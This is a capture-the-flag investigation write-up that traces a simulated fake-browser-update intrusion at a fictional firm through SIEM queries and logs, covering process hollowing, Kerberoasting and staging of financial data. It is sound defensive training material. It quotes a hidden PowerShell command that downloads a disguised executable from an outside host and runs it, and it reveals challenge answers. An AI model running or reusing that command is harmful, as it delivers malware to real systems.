HTB INVESTIGATION GOOGLE CTF

Deceptive Click

A fake browser update leads to PowerShell execution, Kerberoasting and financial-data staging.

By Mehmet Sacit Çınar · 1 November 2026

IN THIS WRITE-UP

Scenario Initial Review Investigation Question 1 Question 2 Question 3 Question 4 Question 5 Question 6 Incident Summary

Scenario

Welcome to the Cymbal Investments Security Operations Center. A high-priority case titled "PowerShell Download And Execute" has just landed in your queue after Curated Detections flagged suspicious activity originating from an endpoint in the Denver office. Leveraging the full power of Google SecOps, from lightning-fast SIEM search and Gemini-assisted investigations to frontline adversary context in Google Threat Intelligence, your mission is to trace the intrusion back to its initial point of entry and uncover the adversary's ultimate objectives before critical corporate assets are compromised.

Field Details
Platform HTB CTF - Operation Cymbal: Cold Room
Difficulty Very Easy
Category Investigation
Environment Google SecOps
Reference FAKEUPDATES Malware Profile.pdf
Author dmncdcco

Initial Review

The scenario and supplied GTI FAKEUPDATES Malware Profile were reviewed before examining the logs. The report described malicious JavaScript delivered through compromised websites posing as browser updates. This provided context for tracing the suspicious PowerShell activity back to its initial download.

In Google SecOps, the Cases view was searched for PowerShell-related activity. The PowerShell Silent Download And Execute Activity case was opened, and its Composite Detections were examined.

Investigation

Question 1

What is the hostname of the compromised endpoint in the Denver office?

Reveal answer

Answer: CYM-DEN-W10-042.cymbal.corp

Within Composite Detections, the entry associated with marcus.vance was expanded. Its NETWORK_CONNECTION event was opened, and the raw Sysmon log was inspected.

The relevant fields identified both the workstation and its source IP:

Query / Log 
EventID:         3
Computer:        CYM-DEN-W10-042.cymbal.corp
SourceHostname:  CYM-DEN-W10-042.cymbal.corp
SourceIp:        10.240.32.115
User:            CYMBAL\marcus.vance
Image:           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
DestinationHost: CYM-DC-01.cymbal.corp
DestinationIp:   10.240.10.2
DestinationPort: 445

The Computer and SourceHostname fields supplied the requested hostname. The same record showed PowerShell initiating a TCP connection to the domain controller on port 445. The source IP and username were retained for subsequent searches.

Question 2

The GTI Malware Profile states that FAKEUPDATES is delivered via compromised third-party websites injecting malicious JavaScript. By analyzing web proxy logs around the time of the download, what is the domain of the compromised blog that served as the referer for the malicious update archive?

Reveal answer

Answer: marketingtrends-insider.com

To identify the update download, the following prompt was entered into Generate Query:

Query / Log 
zip downloads from source ip 10.240.32.115

The generated query filtered URL paths ending in .zip for the compromised endpoint:

Query / Log 
principal.ip = "10.240.32.115" AND re.regex(target.url, "\\.zip$") nocase

Two events were returned: a Canva archive download and a download of ChromeSetup_v124.zip from static.cdn-updater-distribution.net. The Chrome update event was selected, and its raw Zscaler log was examined.

Query / Log 
requestmethod=GET
refererURL=https://marketingtrends-insider.com/
url=https://static.cdn-updater-distribution.net/releases/ChromeSetup_v124.zip
filetype=ZIP
status=200
clientIP=10.240.32.115
user=marcus.vance

The refererURL field linked the malicious update archive to the compromised blog.

Question 3

The secondary payload d27e15eb.exe achieved privilege elevation by hollowing into a SYSTEM process. What was the Target Process ID of the specific svchost.exe instance injected into on the compromised endpoint?

Reveal answer

Answer: 624

Activity associated with the known user or source IP was first reviewed using:

Query / Log 
principal.user.userid = "marcus.vance" OR principal.ip = "10.240.32.115"

The event chain included a process creation event in which wscript.exe launched PowerShell. The parent command line identified the downloaded JavaScript:

Query / Log 
C:\Windows\System32\wscript.exe "C:\Users\marcus.vance\Downloads\ChromeSetup.js"

The PowerShell command downloaded the secondary payload from a .png URL, saved it as an executable in the user's temporary directory, and launched it:

PowerShell 
powershell.exe -w Hidden -c "iwr -usebasicparsing https://static.cdn-updater-distribution.net/assets/d27e15eb.png -OutFile C:\Users\marcus.vance\AppData\Local\Temp\d27e15eb.exe; Start-Process C:\Users\marcus.vance\AppData\Local\Temp\d27e15eb.exe"

The investigation was narrowed through Generate Query with:

Query / Log 
events related to d27e15eb.exe

The resulting query searched for the executable across process and file paths:

Query / Log 
re.regex(target.process.file.full_path, `d27e15eb\.exe$`) nocase OR re.regex(principal.process.file.full_path, `d27e15eb\.exe$`) nocase OR re.regex(principal.file.full_path, `d27e15eb\.exe$`) nocase OR re.regex(target.file.full_path, `d27e15eb\.exe$`) nocase

One event was returned. Its raw Sysmon Event ID 8 record contained the following fields:

Query / Log 
RuleName:        technique_id=T1055.012,technique_name=Process Hollowing
SourceImage:     C:\Users\marcus.vance\AppData\Local\Temp\d27e15eb.exe
SourceProcessId: 6124
SourceUser:      CYMBAL\marcus.vance
TargetImage:     C:\Windows\System32\svchost.exe
TargetProcessId: 624
TargetUser:      NT AUTHORITY\SYSTEM

The record identified d27e15eb.exe as the source and the SYSTEM-owned svchost.exe as the target. The requested value was TargetProcessId, which was 624.

Question 4

Following domain reconnaissance, the adversary conducted Kerberoasting against the Domain Controller (CYM-DC-01) to harvest service credentials. What is the full Service Principal Name (SPN) requested in the Kerberos TGS ticket?

Reveal answer

Answer: MSSQLSvc/CYM-DB-01.cymbal.corp:1433

Windows Event ID 4769 records Kerberos service ticket requests. Requests originating from the compromised endpoint were searched through Generate Query:

Query / Log 
find windows event id 4769 events originating from 10.240.32.115

The generated query was:

Query / Log 
metadata.vendor_name = "Microsoft" AND metadata.log_type = "WINEVTLOG" AND metadata.product_event_type = "4769" AND principal.ip = "10.240.32.115"

One result was returned. The raw event identified the requesting user, domain controller, and service:

Query / Log 
Hostname:             CYM-DC-01.cymbal.corp
EventID:              4769
AccountName:          marcus.vance
ServiceName:          MSSQLSvc/CYM-DB-01.cymbal.corp:1433
TicketEncryptionType: 0x17
Status:               0x0
IpAddress:            ::ffff:10.240.32.115

The ServiceName field supplied the complete SPN. It identified the Microsoft SQL Server service on CYM-DB-01.cymbal.corp, port 1433. The domain controller issued the ticket, while 10.240.32.115 was the requesting endpoint. The encryption type 0x17 indicated RC4-HMAC.

Question 5

Our threat hunting reveals the attacker switched identities using a cracked Kerberos service account. What username was used for subsequent lateral movement?

Reveal answer

Answer: svc_backup

To identify the account used after the ticket request, successful Windows logons from the same source IP were searched:

Query / Log 
metadata.product_event_type = "4624" AND principal.ip = "10.240.32.115"

The search returned one USER_LOGIN event. Its user field showed svc_backup, establishing the identity used in the subsequent logon from the compromised endpoint's IP.

Question 6

What is the file name of the compressed zip archive created by the attacker on the file server to stage sensitive financial audit files?

Reveal answer

Answer: Financial_Audit_2026.zip

With svc_backup identified, the search moved to file creation and copy activity associated with that account:

Query / Log 
(metadata.event_type = "FILE_CREATION" OR metadata.event_type = "FILE_COPY") AND principal.user.userid = "svc_backup"

One matching event was returned:

Query / Log 
Event type: FILE_CREATION
User:       svc_backup
Hostname:   CYM-FS-01.cymbal.corp
File name:  Financial_Audit_2026.zip

The event showed the archive being created on the file server under the compromised service account, identifying the ZIP used to stage the financial audit files.

Incident Summary

  1. Initial delivery: marcus.vance visited marketingtrends-insider.com. The web proxy record linked that blog to the download of ChromeSetup_v124.zip from static.cdn-updater-distribution.net on the Denver workstation, CYM-DEN-W10-042.cymbal.corp (10.240.32.115).
  2. Script execution: ChromeSetup.js was executed through wscript.exe, which launched hidden PowerShell.
  3. Secondary payload: PowerShell downloaded d27e15eb.png, saved it as %LOCALAPPDATA%\Temp\d27e15eb.exe, and started the executable.
  4. Process injection: The secondary executable targeted a SYSTEM-owned svchost.exe instance with PID 624. The event was labelled T1055.012 — Process Hollowing.
  5. Domain reconnaissance: The reviewed event chain showed PowerShell launching net.exe and nltest.exe. A separate network event showed PowerShell connecting to CYM-DC-01 over TCP/445.
  6. Kerberoasting: marcus.vance requested a service ticket from CYM-DC-01 for MSSQLSvc/CYM-DB-01.cymbal.corp:1433. The 4769 record contained the requested SPN and RC4-HMAC encryption type.
  7. Identity switch: A subsequent successful logon from 10.240.32.115 used svc_backup, identifying the account used for further movement in the scenario.
  8. Data staging: Under svc_backup, Financial_Audit_2026.zip was created on CYM-FS-01.cymbal.corp to stage sensitive financial audit files.
